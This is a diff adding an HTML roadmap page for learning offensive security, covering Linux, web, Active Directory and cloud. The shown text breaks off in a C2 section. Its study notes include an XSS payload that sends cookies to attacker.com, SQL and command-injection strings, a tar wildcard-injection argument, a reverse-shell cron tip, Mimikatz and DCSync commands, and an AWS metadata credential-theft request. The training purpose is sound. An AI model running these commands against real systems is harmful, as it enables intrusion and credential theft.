@@ -1,0 +1,1150 @@
+
+<h2 class="sr-only">18-Month Cybersecurity & AI Security Learning Roadmap with progress tracking</h2>
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--font-sans)}
+.wrap{padding:1rem 0}
+.header{margin-bottom:1.5rem}
+.header h1{font-size:20px;font-weight:500;color:var(--color-text-primary)}
+.header p{font-size:13px;color:var(--color-text-secondary);margin-top:4px}
+.progress-bar-wrap{background:var(--color-background-secondary);border-radius:999px;height:8px;margin-top:10px;overflow:hidden;border:0.5px solid var(--color-border-tertiary)}
+.progress-bar-fill{height:100%;background:#1D9E75;border-radius:999px;transition:width 0.4s}
+.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:1.5rem}
+.stat-card{background:var(--color-background-secondary);border-radius:var(--border-radius-md);padding:10px 12px;text-align:center}
+.stat-num{font-size:22px;font-weight:500;color:var(--color-text-primary)}
+.stat-lbl{font-size:11px;color:var(--color-text-secondary);margin-top:2px}
+.phase{margin-bottom:1rem;border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);overflow:hidden;background:var(--color-background-primary)}
+.phase-header{display:flex;align-items:center;gap:10px;padding:12px 14px;cursor:pointer;user-select:none;background:var(--color-background-secondary)}
+.phase-header:hover{background:var(--color-background-tertiary)}
+.phase-badge{font-size:11px;font-weight:500;padding:2px 8px;border-radius:999px;white-space:nowrap}
+.phase-title{font-size:14px;font-weight:500;color:var(--color-text-primary);flex:1}
+.phase-meta{font-size:12px;color:var(--color-text-secondary)}
+.phase-chevron{font-size:16px;color:var(--color-text-secondary);transition:transform 0.2s}
+.phase-chevron.open{transform:rotate(180deg)}
+.phase-body{padding:0 14px 14px;display:none}
+.phase-body.open{display:block}
+.month-section{margin-top:12px}
+.month-label{font-size:12px;font-weight:500;color:var(--color-text-secondary);text-transform:uppercase;letter-spacing:0.04em;margin-bottom:8px;padding-bottom:6px;border-bottom:0.5px solid var(--color-border-tertiary)}
+.topic{border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);margin-bottom:6px;overflow:hidden}
+.topic-header{display:flex;align-items:center;gap:8px;padding:9px 12px;cursor:pointer;background:var(--color-background-primary)}
+.topic-header:hover{background:var(--color-background-secondary)}
+.topic-check{width:18px;height:18px;border-radius:4px;border:1.5px solid var(--color-border-secondary);display:flex;align-items:center;justify-content:center;flex-shrink:0;cursor:pointer;transition:all 0.15s}
+.topic-check.done{background:#1D9E75;border-color:#1D9E75}
+.topic-check.done::after{content:'✓';font-size:11px;color:#fff;font-weight:500}
+.topic-name{font-size:13px;font-weight:500;color:var(--color-text-primary);flex:1}
+.topic-tag{font-size:10px;padding:2px 7px;border-radius:999px;border:0.5px solid var(--color-border-tertiary);color:var(--color-text-secondary)}
+.topic-chevron{font-size:14px;color:var(--color-text-secondary);transition:transform 0.2s}
+.topic-chevron.open{transform:rotate(180deg)}
+.topic-body{display:none;padding:0 12px 12px;border-top:0.5px solid var(--color-border-tertiary);background:var(--color-background-primary)}
+.topic-body.open{display:block}
+.subtopic-list{margin-top:10px}
+.subtopic{display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-bottom:0.5px solid var(--color-border-tertiary)}
+.subtopic:last-child{border-bottom:none}
+.sub-check{width:15px;height:15px;border-radius:3px;border:1.5px solid var(--color-border-secondary);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;cursor:pointer;transition:all 0.15s}
+.sub-check.done{background:#1D9E75;border-color:#1D9E75}
+.sub-check.done::after{content:'✓';font-size:9px;color:#fff;font-weight:500}
+.sub-content{flex:1}
+.sub-name{font-size:12px;font-weight:500;color:var(--color-text-primary)}
+.sub-desc{font-size:11px;color:var(--color-text-secondary);margin-top:2px;line-height:1.5}
+.sub-links{display:flex;flex-wrap:wrap;gap:4px;margin-top:5px}
+.sub-link{font-size:10px;padding:2px 7px;border-radius:999px;border:0.5px solid var(--color-border-tertiary);color:var(--color-text-secondary);text-decoration:none;background:var(--color-background-secondary)}
+.sub-link:hover{border-color:var(--color-border-primary);color:var(--color-text-primary)}
+.sub-link.free{border-color:#0F6E56;color:#0F6E56}
+.sub-link.paid{border-color:#854F0B;color:#854F0B}
+.sub-link.lab{border-color:#3C3489;color:#3C3489}
+.deep-list{margin-top:6px;padding-left:14px}
+.deep-item{font-size:11px;color:var(--color-text-secondary);padding:2px 0;line-height:1.5;list-style:disc}
+.deep-item::marker{color:var(--color-text-secondary)}
+.section-label{font-size:10px;font-weight:500;color:var(--color-text-secondary);text-transform:uppercase;letter-spacing:0.05em;margin:8px 0 4px}
+.interview-q{background:var(--color-background-secondary);border-left:2px solid #534AB7;padding:6px 10px;margin:3px 0;border-radius:0 4px 4px 0;font-size:11px;color:var(--color-text-primary)}
+.checklist-item{display:flex;align-items:flex-start;gap:6px;padding:3px 0;font-size:11px;color:var(--color-text-secondary)}
+.checklist-item::before{content:'□';flex-shrink:0;color:var(--color-text-secondary)}
+</style>
+
+<div class="wrap">
+<div class="header">
+  <h1><i class="ti ti-shield-lock" aria-hidden="true" style="font-size:18px;vertical-align:-2px;margin-right:6px;color:#1D9E75"></i>Cybersecurity & AI Security — 18 Month Roadmap</h1>
+  <p>June 2026 – December 2027 · B.Tech CSE Fresher → ₹15–20 LPA Professional · Tap any topic to expand deep content</p>
+  <div class="progress-bar-wrap"><div class="progress-bar-fill" id="main-bar" style="width:0%"></div></div>
+  <p style="font-size:11px;color:var(--color-text-secondary);margin-top:5px" id="main-pct">0% complete — keep going!</p>
+</div>
+
+<div class="stats-row">
+  <div class="stat-card"><div class="stat-num" id="s-done">0</div><div class="stat-lbl">Topics done</div></div>
+  <div class="stat-card"><div class="stat-num" id="s-total">0</div><div class="stat-lbl">Total topics</div></div>
+  <div class="stat-card"><div class="stat-num" id="s-sub">0</div><div class="stat-lbl">Subtopics done</div></div>
+  <div class="stat-card"><div class="stat-num" id="s-streak">0</div><div class="stat-lbl">Days streak</div></div>
+</div>
+
+<div id="roadmap"></div>
+</div>
+
+<script>
+const DATA = [
+  {
+    phase:"Phase 1 — Foundation Fortress",
+    months:"Jun–Aug 2026",
+    color:"#1D9E75",
+    badge:"Months 1–3",
+    badgeBg:"#E1F5EE",badgeFg:"#0F6E56",
+    months_data:[
+      {
+        label:"Month 1 — Linux + Networking + Python",
+        topics:[
+          {
+            name:"Linux Fundamentals",tag:"Core Skill",
+            subtopics:[
+              {
+                name:"Filesystem & Navigation",
+                desc:"Master the Linux directory tree. Everything is a file — /etc, /tmp, /var/log, /proc. Learn how attackers use each.",
+                links:[
+                  {t:"OverTheWire Bandit",u:"https://overthewire.org/wargames/bandit/",cls:"free lab"},
+                  {t:"TryHackMe Linux 1",u:"https://tryhackme.com/room/linuxfundamentals1",cls:"paid lab"},
+                  {t:"Linux Command Line (free book)",u:"https://linuxcommand.org/tlcl.php",cls:"free"}
+                ],
+                deep:[
+                  "pwd, ls -la, cd, cat, less, head, tail, file, strings",
+                  "Security dirs: /etc (configs), /tmp (world-writable), /var/log (evidence), /proc (live memory)",
+                  "Hidden files start with . — always use ls -la not ls",
+                  "find / -name '*.conf' 2>/dev/null — find config files",
+                  "grep -ri 'password' /var/www/ — find hardcoded creds"
+                ],
+                interview:["What is /proc and why does it matter to attackers?","How do you find all files modified in the last 24 hours?"]
+              },
+              {
+                name:"File Permissions & SUID",
+                desc:"rwx, chmod numbers, SUID/SGID/Sticky bit. SUID is the #1 Linux privilege escalation vector — know it cold.",
+                links:[
+                  {t:"GTFOBins",u:"https://gtfobins.github.io",cls:"free lab"},
+                  {t:"THM Linux PrivEsc",u:"https://tryhackme.com/room/linuxprivesc",cls:"paid lab"}
+                ],
+                deep:[
+                  "r=4, w=2, x=1 → chmod 755 = rwxr-xr-x, 644 = rw-r--r--",
+                  "SUID (4000): binary runs as file OWNER, not caller → root SUID = privesc",
+                  "find / -perm -u=s -type f 2>/dev/null — find all SUID binaries",
+                  "GTFOBins: database of exploitable SUID/sudo binaries",
+                  "Sticky bit on /tmp: prevents users deleting each other's files"
+                ],
+                interview:["Explain SUID and show an exploitation example","How does chmod 4755 differ from chmod 755?"]
+              },
+              {
+                name:"Users, Groups & Sudo",
+                desc:"User enumeration, sudo misconfigurations, /etc/passwd vs /etc/shadow. sudo -l is the first command on every box.",
+                links:[
+                  {t:"/etc/passwd format",u:"https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/",cls:"free"},
+                  {t:"THM Sudo Security",u:"https://tryhackme.com/room/sudovulnsbypass",cls:"paid lab"}
+                ],
+                deep:[
+                  "sudo -l → always run first on any Linux shell",
+                  "/etc/passwd: username:x:UID:GID:comment:home:shell",
+                  "/etc/shadow: password hashes — root only readable",
+                  "UID 0 = root. Multiple UID 0 accounts = backdoor sign",
+                  "sudo -u www-data command → run as another user"
+                ],
+                interview:["You find (ALL) NOPASSWD: /usr/bin/python3 in sudo -l. What do you do?","What is the difference between su and sudo?"]
+              },
+              {
+                name:"Bash Scripting for Security",
+                desc:"Write automation scripts. Port scanners, recon tools, log parsers. This is what separates script kiddies from professionals.",
+                links:[
+                  {t:"Bash Guide",u:"https://mywiki.wooledge.org/BashGuide",cls:"free"},
+                  {t:"Black Hat Bash (book)",u:"https://nostarch.com/black-hat-bash",cls:"paid"}
+                ],
+                deep:[
+                  "Variables, conditionals (if/else), loops (for/while), functions",
+                  "Pipes: cat file | grep | awk | sort | uniq -c | sort -rn",
+                  "awk -F: '{print $1}' /etc/passwd → extract usernames",
+                  "Build: port scanner, subdomain enumerator, log analyzer",
+                  "set -e (exit on error), set -u (no unset vars) — always use"
+                ],
+                interview:["Write a bash one-liner to find top 10 IPs in an access log","How would you loop through a list of hosts and run nmap on each?"]
+              },
+              {
+                name:"Cron Jobs & PrivEsc",
+                desc:"Cron misconfigurations are a top Linux privesc vector. Writable scripts, PATH hijacking, wildcard injection.",
+                links:[
+                  {t:"cron privesc guide",u:"https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-jobs-cron",cls:"free lab"}
+                ],
+                deep:[
+                  "cat /etc/crontab, ls /etc/cron.d/, crontab -l",
+                  "Attack: writable script run by root cron → append reverse shell",
+                  "PATH hijacking: cron runs backup without full path → drop malicious binary in /tmp",
+                  "Wildcard injection: tar czf backup.tar.gz * → --checkpoint-action=exec=sh shell.sh",
+                  "pspy tool: monitor cron without root (github.com/DominicBreuker/pspy)"
+                ],
+                interview:["A cron job runs /opt/backup.sh as root every minute and you can write to it. What do you do?"]
+              }
+            ]
+          },
+          {
+            name:"Networking Fundamentals",tag:"Core Skill",
+            subtopics:[
+              {
+                name:"OSI Model & TCP/IP",
+                desc:"The language of all attacks. Layers 3 (IP), 4 (TCP/UDP), 7 (HTTP) is where 90% of attacks happen.",
+                links:[
+                  {t:"Professor Messer Net+",u:"https://www.professormesser.com/network-plus/n10-009/n10-009-video/n10-009-training-course/",cls:"free"},
+                  {t:"Cisco Packet Tracer",u:"https://www.netacad.com/courses/packet-tracer",cls:"free lab"}
+                ],
+                deep:[
+                  "L1 Physical → L2 Data Link (MAC) → L3 Network (IP) → L4 Transport (TCP/UDP) → L7 Application (HTTP)",
+                  "TCP 3-way handshake: SYN → SYN-ACK → ACK",
+                  "Know top 50 ports by heart: 22 SSH, 80 HTTP, 443 HTTPS, 445 SMB, 3389 RDP...",
+                  "UDP: connectionless, used by DNS (53), DHCP (67/68), SNMP (161)",
+                  "Wireshark filter: tcp.port==80 && http.request"
+                ],
+                interview:["What happens at every layer when you type google.com?","Why would an attacker prefer UDP over TCP for C2?"]
+              },
+              {
+                name:"DNS, HTTP & ARP",
+                desc:"DNS = phone book of the internet. HTTP = how web works. ARP = how local network routes. All three are attackable.",
+                links:[
+                  {t:"DNS explained",u:"https://howdns.works",cls:"free"},
+                  {t:"Wireshark labs",u:"https://www.wireshark.org/docs/wsug_html_chunked/",cls:"free lab"}
+                ],
+                deep:[
+                  "DNS records: A (IPv4), AAAA (IPv6), MX (mail), CNAME (alias), TXT (SPF/DKIM), NS (nameserver)",
+                  "dig google.com, dig google.com MX, dig @8.8.8.8 google.com",
+                  "ARP: maps IP → MAC on local network. ARP spoofing = MITM attack",
+                  "HTTP headers: Host, User-Agent, Cookie, Authorization, X-Forwarded-For",
+                  "HTTPS: TLS handshake, certificate chain, SNI header"
+                ],
+                interview:["Explain a DNS poisoning attack","How does ARP spoofing enable a MITM attack?"]
+              }
+            ]
+          },
+          {
+            name:"Python for Security",tag:"Core Skill",
+            subtopics:[
+              {
+                name:"Python Basics → Security Focus",
+                desc:"Not a full Python course — only what security engineers need: sockets, requests, subprocess, file I/O, scapy.",
+                links:[
+                  {t:"Automate Boring Stuff (free)",u:"https://automatetheboringstuff.com",cls:"free"},
+                  {t:"Black Hat Python (book)",u:"https://nostarch.com/black-hat-python2E",cls:"paid"},
+                  {t:"Violent Python (PDF)",u:"https://github.com/dcmorton/book-pdf",cls:"free"}
+                ],
+                deep:[
+                  "Data types, loops, functions, file I/O, error handling — in 1 week",
+                  "socket module: TCP/UDP clients, banner grabbing, port scanner",
+                  "requests library: HTTP GET/POST, headers, cookies, sessions",
+                  "subprocess: run system commands from Python scripts",
+                  "scapy: craft raw packets, ARP spoof, sniff traffic"
+                ],
+                interview:["Write a Python port scanner","How would you use Python's requests library to test for IDOR?"]
+              },
+              {
+                name:"Security Tools to Build",
+                desc:"5 tools minimum on GitHub. These are your portfolio evidence. Employers look for these.",
+                links:[
+                  {t:"GitHub (create repo)",u:"https://github.com",cls:"free"}
+                ],
+                deep:[
+                  "Tool 1: Port scanner with banner grabbing",
+                  "Tool 2: Subdomain enumerator (DNS brute force)",
+                  "Tool 3: Password hash cracker (MD5/SHA256 wordlist)",
+                  "Tool 4: Directory brute forcer (like gobuster in Python)",
+                  "Tool 5: Log analyzer — find brute force IPs from auth.log"
+                ],
+                interview:[]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        label:"Month 2 — Web Security + Burp Suite + OWASP",
+        topics:[
+          {
+            name:"Web Fundamentals (Security Lens)",tag:"Web Security",
+            subtopics:[
+              {
+                name:"HTTP Deep Dive",
+                desc:"Every web attack travels over HTTP. Headers, methods, cookies, sessions, JWTs — know every field and how to abuse it.",
+                links:[
+                  {t:"MDN HTTP docs",u:"https://developer.mozilla.org/en-US/docs/Web/HTTP",cls:"free"},
+                  {t:"PortSwigger Web Academy",u:"https://portswigger.net/web-security",cls:"free lab"}
+                ],
+                deep:[
+                  "Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD",
+                  "Headers: Host, Cookie, Authorization, Content-Type, X-Forwarded-For, Referer",
+                  "Status codes: 200 OK, 301/302 Redirect, 401 Unauth, 403 Forbidden, 500 Server Error",
+                  "Cookies: Secure, HttpOnly, SameSite flags — what each prevents",
+                  "JWT structure: header.payload.signature — alg:none attack, weak secret"
+                ],
+                interview:["What is the difference between authentication and authorization?","How does HttpOnly cookie flag prevent XSS?"]
+              },
+              {
+                name:"Same-Origin Policy & CORS",
+                desc:"SOP is the #1 browser security mechanism. Misonfigured CORS = data theft. You must understand this for XSS and CSRF.",
+                links:[
+                  {t:"PortSwigger CORS labs",u:"https://portswigger.net/web-security/cors",cls:"free lab"}
+                ],
+                deep:[
+                  "SOP: browser blocks JS from reading responses from different origins",
+                  "Origin = protocol + domain + port",
+                  "CORS misconfiguration: Access-Control-Allow-Origin: * with credentials → data theft",
+                  "CSRF: SOP doesn't block form submissions → forged cross-origin requests",
+                  "CSRF tokens: how they work, how to bypass weak implementations"
+                ],
+                interview:["Explain a CORS misconfiguration attack scenario"]
+              }
+            ]
+          },
+          {
+            name:"OWASP Top 10",tag:"Critical",
+            subtopics:[
+              {
+                name:"A01 Broken Access Control",
+                desc:"#1 most common web vulnerability. IDOR, path traversal, forced browsing, privilege escalation via API.",
+                links:[
+                  {t:"PortSwigger Access Control labs",u:"https://portswigger.net/web-security/access-control",cls:"free lab"},
+                  {t:"OWASP A01",u:"https://owasp.org/Top10/A01_2021-Broken_Access_Control/",cls:"free"}
+                ],
+                deep:[
+                  "IDOR: change user_id=123 to user_id=124 → access another user's data",
+                  "Path traversal: ../../../etc/passwd in file parameter",
+                  "Forced browsing: /admin, /backup, /debug endpoints without auth check",
+                  "Method tampering: GET blocked but POST allowed for same action",
+                  "Horizontal vs vertical privilege escalation"
+                ],
+                interview:["You find /api/user?id=1001 returns your data. What's your next step?"]
+              },
+              {
+                name:"A03 Injection (SQLi, XSS, Command)",
+                desc:"Classic but still deadly. SQLi extracts databases. XSS steals sessions. Command injection gives OS-level access.",
+                links:[
+                  {t:"PortSwigger SQLi labs (28 free)",u:"https://portswigger.net/web-security/sql-injection",cls:"free lab"},
+                  {t:"PortSwigger XSS labs",u:"https://portswigger.net/web-security/cross-site-scripting",cls:"free lab"},
+                  {t:"DVWA",u:"https://dvwa.co.uk",cls:"free lab"}
+                ],
+                deep:[
+                  "SQLi: ' OR '1'='1 → Union-based → Blind Boolean → Time-based → OOB",
+                  "SQLMap: sqlmap -u 'http://target.com/page?id=1' --dbs",
+                  "XSS types: Reflected (URL), Stored (DB), DOM-based (client-side), Blind (admin panel)",
+                  "XSS payload: <script>document.location='http://attacker.com/?c='+document.cookie</script>",
+                  "Command injection: ;id, &&whoami, |cat /etc/passwd in OS command parameters"
+                ],
+                interview:["Explain Union-based SQLi step by step","What is the difference between Stored and Reflected XSS?"]
+              },
+              {
+                name:"A10 SSRF + Other Top 10",
+                desc:"SSRF is cloud-era critical. Hits AWS metadata endpoint → steals IAM credentials → account takeover.",
+                links:[
+                  {t:"PortSwigger SSRF labs",u:"https://portswigger.net/web-security/ssrf",cls:"free lab"},
+                  {t:"OWASP Top 10 full",u:"https://owasp.org/Top10/",cls:"free"}
+                ],
+                deep:[
+                  "SSRF: server makes request to attacker-controlled URL → access internal services",
+                  "AWS SSRF: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "Blind SSRF: use Burp Collaborator to detect out-of-band callbacks",
+                  "XXE: XML external entity → read local files, SSRF via XML",
+                  "Insecure Deserialization: modify serialized objects → RCE"
+                ],
+                interview:["Show me an SSRF attack that steals AWS credentials"]
+              }
+            ]
+          },
+          {
+            name:"Burp Suite Mastery",tag:"Tool",
+            subtopics:[
+              {
+                name:"Proxy, Repeater & Intruder",
+                desc:"The core workflow. Intercept every request, modify and replay with Repeater, fuzz with Intruder.",
+                links:[
+                  {t:"PortSwigger Burp Academy",u:"https://portswigger.net/burp/documentation/desktop/getting-started",cls:"free"},
+                  {t:"THM Burp Suite rooms",u:"https://tryhackme.com/module/learn-burp-suite",cls:"paid lab"},
+                  {t:"BSCP Certification",u:"https://portswigger.net/web-security/certification",cls:"paid"}
+                ],
+                deep:[
+                  "Proxy: intercept, modify, forward HTTP requests between browser and server",
+                  "Repeater: manually craft and replay individual requests — core pentesting loop",
+                  "Intruder: Sniper (1 payload position), Battering ram, Pitchfork, Cluster bomb modes",
+                  "Match-and-replace: auto-replace tokens, user-agent, headers on all requests",
+                  "Burp Collaborator: detect out-of-band interactions (blind SQLi, blind XSS, SSRF)"
+                ],
+                interview:["How do you test for IDOR using Burp?","Explain Intruder's Pitchfork vs Cluster Bomb attack types"]
+              },
+              {
+                name:"Extensions & Advanced Features",
+                desc:"Burp's power comes from extensions. Autorize for access control testing. Turbo Intruder for speed. Logger++ for everything.",
+                links:[
+                  {t:"BApp Store",u:"https://portswigger.net/bappstore",cls:"free"}
+                ],
+                deep:[
+                  "Autorize: automatically test every request as lower-priv user → find privilege escalation",
+                  "Turbo Intruder: Python-scripted fuzzer, much faster than Intruder",
+                  "Logger++: advanced request logging with search/filter",
+                  "Active Scan++: better active scanning for Pro users",
+                  "Param Miner: discover hidden parameters in requests"
+                ],
+                interview:[]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        label:"Month 3 — Git + SOC Basics + Lab Setup",
+        topics:[
+          {
+            name:"Git & GitHub Portfolio",tag:"Career",
+            subtopics:[
+              {
+                name:"Git Fundamentals",
+                desc:"Version control is non-negotiable. Your GitHub is your resume. Employers look here before your CV.",
+                links:[
+                  {t:"Pro Git book (free)",u:"https://git-scm.com/book/en/v2",cls:"free"},
+                  {t:"GitHub Skills",u:"https://skills.github.com",cls:"free lab"}
+                ],
+                deep:[
+                  "init, clone, add, commit, push, pull, fetch, status, log, diff",
+                  "Branching: branch, checkout -b, merge, rebase",
+                  "git blame: trace who wrote each line — useful for code auditing",
+                  ".gitignore: NEVER commit API keys, passwords, private keys",
+                  "git log --oneline --graph: visualize branch history"
+                ],
+                interview:["How would you use git blame in a security code review?","What do you check in .gitignore to prevent secret leaks?"]
+              },
+              {
+                name:"Portfolio Structure to Build",
+                desc:"Your GitHub needs to tell a story. Structure it like a security engineer's portfolio, not a student's homework.",
+                links:[
+                  {t:"GitHub Profile README guide",u:"https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/managing-your-profile-readme",cls:"free"}
+                ],
+                deep:[
+                  "Repo 1: security-tools (Python tools you built)",
+                  "Repo 2: ctf-writeups (HackTheBox, TryHackMe solutions)",
+                  "Repo 3: active-directory-lab (AD attack documentation)",
+                  "Repo 4: ai-security-research (prompt injection, RAG attacks)",
+                  "Profile README: skills, certs, stats badge, contact info"
+                ],
+                interview:[]
+              }
+            ]
+          },
+          {
+            name:"SOC Fundamentals",tag:"Blue Team",
+            subtopics:[
+              {
+                name:"SIEM, Logs & Alerts",
+                desc:"Even as an offensive person, you need to know what defenders see. This helps you evade detection and write better reports.",
+                links:[
+                  {t:"THM SOC Level 1 path",u:"https://tryhackme.com/path/outline/soclevel1",cls:"paid lab"},
+                  {t:"Splunk Free Training",u:"https://www.splunk.com/en_us/training/free-courses/overview.html",cls:"free"}
+                ],
+                deep:[
+                  "SIEM: Security Information and Event Management — Splunk, Microsoft Sentinel, QRadar",
+                  "Log sources: Windows Event Logs, Syslog, IDS/IPS, Firewall, EDR",
+                  "Key Windows events: 4624 (login), 4625 (failed login), 4688 (process create), 4720 (user created)",
+                  "Indicators of Compromise (IOC): IPs, hashes, domains, registry keys",
+                  "MITRE ATT&CK: framework of attacker tactics and techniques"
+                ],
+                interview:["What Windows Event ID would you look for to detect Pass-the-Hash?","What is the difference between an IOC and a TTPs?"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 2 — Core Offensive Security",
+    months:"Sep–Dec 2026",
+    color:"#534AB7",
+    badge:"Months 4–7",
+    badgeBg:"#EEEDFE",badgeFg:"#3C3489",
+    months_data:[
+      {
+        label:"Month 4–5 — Active Directory + Privilege Escalation",
+        topics:[
+          {
+            name:"Active Directory Attacks",tag:"High Value",
+            subtopics:[
+              {
+                name:"AD Enumeration",
+                desc:"You can't attack what you don't understand. BloodHound maps the entire AD attack path visually. Always run this first.",
+                links:[
+                  {t:"BloodHound",u:"https://github.com/BloodHoundAD/BloodHound",cls:"free lab"},
+                  {t:"THM AD Basics",u:"https://tryhackme.com/room/activedirectorybasics",cls:"paid lab"},
+                  {t:"The Hacker Recipes",u:"https://www.thehacker.recipes",cls:"free"}
+                ],
+                deep:[
+                  "BloodHound/SharpHound: graph all AD objects, find attack paths to Domain Admin",
+                  "PowerView: Get-NetUser, Get-NetGroup, Get-NetComputer, Find-LocalAdminAccess",
+                  "ldapdomaindump: dump entire AD over LDAP",
+                  "enum4linux-ng: enumerate SMB/RPC for users, shares, policies",
+                  "Key targets: Domain Admins, Enterprise Admins, Service Accounts, GPOs"
+                ],
+                interview:["What is BloodHound and what does SharpHound collect?","How do you find users with Kerberos pre-auth disabled?"]
+              },
+              {
+                name:"Kerberoasting & AS-REP Roasting",
+                desc:"Extract service ticket hashes (no special privileges needed for Kerberoasting) and crack them offline. Huge in real pentests.",
+                links:[
+                  {t:"Impacket",u:"https://github.com/fortra/impacket",cls:"free lab"},
+                  {t:"THM Attacking Kerberos",u:"https://tryhackme.com/room/attackingkerberos",cls:"paid lab"}
+                ],
+                deep:[
+                  "Kerberoasting: request TGS for SPN accounts → crack RC4 hash offline with hashcat",
+                  "GetUserSPNs.py -dc-ip 10.0.0.1 domain/user:pass -request",
+                  "AS-REP Roasting: accounts with no pre-auth → get AS-REP hash without password",
+                  "GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1",
+                  "Defense: long random passwords on service accounts, AES-only Kerberos"
+                ],
+                interview:["Explain the difference between Kerberoasting and AS-REP Roasting","What privilege level is required for Kerberoasting?"]
+              },
+              {
+                name:"Pass-the-Hash & Pass-the-Ticket",
+                desc:"Lateral movement without knowing the cleartext password. NTLM hash or Kerberos ticket is enough.",
+                links:[
+                  {t:"Mimikatz",u:"https://github.com/gentilkiwi/mimikatz",cls:"free lab"},
+                  {t:"Impacket psexec",u:"https://github.com/fortra/impacket",cls:"free lab"}
+                ],
+                deep:[
+                  "PtH: use NTLM hash directly — psexec.py, wmiexec.py, evil-winrm",
+                  "PtT: inject Kerberos ticket (ccache) → mimikatz sekurlsa::pth",
+                  "Mimikatz: sekurlsa::logonpasswords (dump hashes from LSASS memory)",
+                  "DCSync: mimikat lsadump::dcsync /user:krbtgt — replicate DC credentials",
+                  "Golden Ticket: forge TGT with krbtgt hash → unlimited domain access"
+                ],
+                interview:["What is a Golden Ticket attack and how long does it last?","How does DCSync work and what rights are required?"]
+              },
+              {
+                name:"LLMNR/NBT-NS Poisoning",
+                desc:"One of the easiest initial access techniques in internal pentests. Responder captures NTLMv2 hashes just by listening.",
+                links:[
+                  {t:"Responder",u:"https://github.com/lgandx/Responder",cls:"free lab"},
+                  {t:"TCM PEH course",u:"https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course",cls:"paid"}
+                ],
+                deep:[
+                  "LLMNR/NBT-NS: Windows fallback name resolution → responds to any hostname query",
+                  "Responder -I eth0 -rdwv → captures NTLMv2 hashes automatically",
+                  "Crack with hashcat: hashcat -m 5600 hash.txt rockyou.txt",
+                  "Relay attack: if SMB signing off → ntlmrelayx.py → SYSTEM shell",
+                  "Detection: alert on multiple NTLMv2 challenge-responses in SIEM"
+                ],
+                interview:["How does Responder work? What protocols does it abuse?"]
+              }
+            ]
+          },
+          {
+            name:"Windows Privilege Escalation",tag:"High Value",
+            subtopics:[
+              {
+                name:"WinPEAS & Manual Enumeration",
+                desc:"Automated + manual enumeration. WinPEAS finds everything. But interviews test manual knowledge — know both.",
+                links:[
+                  {t:"PEASS-ng (WinPEAS)",u:"https://github.com/peass-ng/PEASS-ng",cls:"free lab"},
+                  {t:"LOLBAS",u:"https://lolbas-project.github.io",cls:"free lab"},
+                  {t:"THM Windows PrivEsc",u:"https://tryhackme.com/room/windows10privesc",cls:"paid lab"}
+                ],
+                deep:[
+                  "whoami /priv — check token privileges (SeImpersonatePrivilege = Potato attack)",
+                  "systeminfo — OS version, hotfixes → find missing patches",
+                  "wmic qfe — installed patches (find CVEs not patched)",
+                  "sc query / sc qc ServiceName — service configurations",
+                  "icacls 'C:\\Program Files\\App' — check folder write permissions"
+                ],
+                interview:["You have SeImpersonatePrivilege. How do you escalate to SYSTEM?"]
+              },
+              {
+                name:"Service Misconfigurations & DLL Hijacking",
+                desc:"Unquoted service paths, weak service permissions, DLL search order hijacking — top Windows privesc techniques.",
+                links:[
+                  {t:"HackTricks Windows PrivEsc",u:"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation",cls:"free"}
+                ],
+                deep:[
+                  "Unquoted path: C:\\Program Files\\My App\\app.exe → place C:\\Program.exe",
+                  "Weak service DACL: sc sdshow ServiceName → if writable, change binPath",
+                  "DLL hijacking: find missing DLL in writable dir on PATH → drop malicious DLL",
+                  "AlwaysInstallElevated: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+                  "Potato attacks: JuicyPotato, PrintSpoofer, RoguePotato → SYSTEM from IIS/service"
+                ],
+                interview:["Explain an unquoted service path attack with an example"]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        label:"Month 6–7 — Cloud Security + Red Team Basics + Cert Sprint",
+        topics:[
+          {
+            name:"Cloud Security (AWS Focus)",tag:"High Value",
+            subtopics:[
+              {
+                name:"AWS Attack Surface",
+                desc:"Every company is on AWS. SSRF to metadata endpoint is the most common cloud attack. IAM misconfigs are everywhere.",
+                links:[
+                  {t:"flaws.cloud (free lab)",u:"http://flaws.cloud",cls:"free lab"},
+                  {t:"CloudGoat",u:"https://github.com/RhinoSecurityLabs/cloudgoat",cls:"free lab"},
+                  {t:"HackingThe.Cloud",u:"https://hackingthe.cloud",cls:"free"}
+                ],
+                deep:[
+                  "S3 bucket misconfiguration: aws s3 ls s3://bucketname --no-sign-request",
+                  "IMDSv1 SSRF: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "IAM privilege escalation: iam:CreatePolicyVersion, iam:PassRole, lambda:InvokeFunction",
+                  "Pacu: AWS exploitation framework (like Metasploit for AWS)",
+                  "CloudTrail: check if logging enabled — attackers disable it first"
+                ],
+                interview:["How would you exploit an SSRF vulnerability to steal AWS credentials?","What is the AWS metadata endpoint and why is it dangerous?"]
+              }
+            ]
+          },
+          {
+            name:"Red Team C2 Frameworks",tag:"Advanced",
+            subtopics:[
+              {
+                name:"C2 Fundamentals with Sliver",
+                desc:"Command & Control is the backbone of red team ops. Sliver is free, modern, and increasingly used in real engagements.",
+                links:[
+                  {t:"Sliver C2",u:"https://github.com/BishopFox/sliver",cls:"free lab"},
+                  {t:"Havoc C2",u:"https://github.com/HavocFramework/Havoc",cls:"free lab"},
+                  {t:"Red Team Ops course",u:"https://courses.zero-point-security.co.uk/red-team-ops",cls:"paid"}
+                ],
+                deep:[
+                  "C2 anatomy: implant (on victim) ↔ listener (on attacker server) ↔ operator console",
